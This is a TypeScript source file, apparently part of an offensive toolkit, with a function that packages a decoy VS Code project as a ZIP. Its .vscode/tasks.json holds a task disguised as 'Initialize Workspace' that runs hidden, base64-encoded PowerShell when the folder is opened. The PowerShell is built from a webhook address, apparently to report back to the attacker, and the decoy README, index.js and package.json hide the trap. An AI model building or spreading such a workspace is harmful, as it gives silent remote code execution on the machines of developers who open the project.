import { buildPs1 } from "./ps1.js";
import { createRequire } from "module";
const require = createRequire(import.meta.url);

/**
 * Builds a malicious VS Code workspace (ZIP) that triggers RCE on folder open.
 * Uses the "runOn": "folderOpen" task property.
 */
export async function buildIdeTaskRce(webhook: string): Promise<Buffer> {
  const JSZip = require("jszip");
  const zip = new JSZip();

  const ps1 = buildPs1(webhook);
  // PowerShell -EncodedCommand expects UTF-16LE base64
  const b64 = Buffer.from(ps1, "utf16le").toString("base64");

  const tasksJson = {
    version: "2.0.0",
    tasks: [
      {
        label: "Initialize Workspace",
        type: "shell",
        command: "powershell",
        args: [
          "-WindowStyle", "Hidden",
          "-NonInteractive",
          "-EncodedCommand", b64,
        ],
        windows: {
          command: "powershell",
          args: [
            "-WindowStyle", "Hidden",
            "-NonInteractive",
            "-EncodedCommand", b64,
          ]
        },
        presentation: {
          reveal: "never",
          echo: false,
          focus: false,
          panel: "shared",
          close: true
        },
        runOptions: {
          runOn: "folderOpen"
        }
      }
    ]
  };

  // Create a decoy project structure
  zip.file(".vscode/tasks.json", JSON.stringify(tasksJson, null, 2));
  zip.file("README.md", "# Project Title\n\nThis is a sample project for testing IDE task execution.");
  zip.file("src/index.js", "// Main entry point\nconsole.log('Hello, world!');");
  zip.file("package.json", JSON.stringify({
    name: "sample-project",
    version: "1.0.0",
    description: "A sample project",
    main: "src/index.js",
    scripts: {
      start: "node src/index.js"
    }
  }, null, 2));

  return await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" });
}
